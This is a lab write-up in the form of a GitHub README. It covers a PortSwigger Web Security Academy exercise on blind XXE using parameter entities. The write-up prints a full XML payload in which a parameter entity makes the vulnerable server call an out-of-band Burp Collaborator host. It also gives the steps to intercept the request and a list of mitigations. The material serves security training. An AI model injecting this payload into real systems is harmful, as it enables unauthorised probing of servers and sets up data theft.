
### 📁 `README.md` — Blind XXE via Parameter Entity (OOB)

# 🌐 Blind XXE via Parameter Entities and Out-of-Band Interaction

**🧪 Lab Level:** Practitioner  
**🔐 Vulnerability:** Blind XXE using Parameter Entities  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Trigger a DNS/HTTP interaction with Burp Collaborator using a parameter entity (`%xxe`) in a blind XXE context.

---

## 🔍 Lab Summary

This lab demonstrates a **blind XXE vulnerability** that:
- **Blocks standard external entities** (like `<!ENTITY xxe SYSTEM ...>`)
- Accepts **parameter entities** (like `<!ENTITY % xxe SYSTEM ...>`)
- Requires **out-of-band (OOB)** detection using **Burp Collaborator**

---

## ⚙️ Exploitation Steps

### 1. 🕵️ Intercept the Request

Navigate to any product and click **"Check stock"**  
In **Burp Suite Professional**, intercept the following request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
````

---

### 2. 💣 Inject the Parameter Entity Payload

Replace the XML body with this **parameter-based XXE injection**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

> 🔧 In Burp: Right-click → “Insert Collaborator Payload” to get a valid subdomain.

---

### 3. 🔍 Monitor for Interactions

In the **"Burp Collaborator"** tab:

* Click **"Poll now"**
* Wait a few seconds
* You should see **DNS and/or HTTP requests** from the vulnerable server

This confirms the server parsed and resolved the external entity declared via `%xxe`.
![XXE](https://github.com/Kabilala/xxe/blob/main/lab4/lab4.png)
---

## 🧠 Technical Breakdown

| Feature   | Description                                                |
| --------- | ---------------------------------------------------------- |
| `% xxe`   | Parameter entity (used in DTD context only)                |
| `%xxe;`   | Triggering the entity resolution inside the DTD            |
| **Blind** | No visible output — detection happens through Collaborator |
| **OOB**   | Out-of-band detection using DNS or HTTP requests           |

🧪 Parameter entities are interpreted differently by XML parsers. This trick bypasses filters that block regular `<!ENTITY xxe SYSTEM ...>` usage.

---

## 🔐 Mitigations

* **Disable DTDs** completely in XML parsers
* Prevent use of both `%` parameter entities and `SYSTEM` calls
* Isolate internal services from XML-parsing components
* Use secure XML parsers (e.g. `defusedxml`, `SAXParserFactory` with features off)

---

## 📚 References

* [📘 PortSwigger XXE Labs](https://portswigger.net/web-security/xxe/blind)
* [🧠 OWASP XXE Prevention Guide](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [📖 Burp Suite Collaborator Docs](https://portswigger.net/burp/documentation/collaborator)

